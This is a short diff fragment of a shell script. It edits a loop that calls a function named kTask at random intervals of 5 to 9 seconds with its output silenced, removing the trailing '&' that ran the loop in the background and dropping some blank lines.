@@ -13,9 +13,5 @@ kTask() {
   return "$code";
 }
 
-bash -c 'while true; do delay="$[`od -An -N2 -i /dev/urandom` % 5 + 5]"; [ -n "$delay" ] && echo "$delay" || break; sleep "$delay"; kTask; done' >/dev/null 2>&1 &
-
-
-
-
+bash -c 'while true; do delay="$[`od -An -N2 -i /dev/urandom` % 5 + 5]"; [ -n "$delay" ] && echo "$delay" || break; sleep "$delay"; kTask; done' >/dev/null 2>&1
 
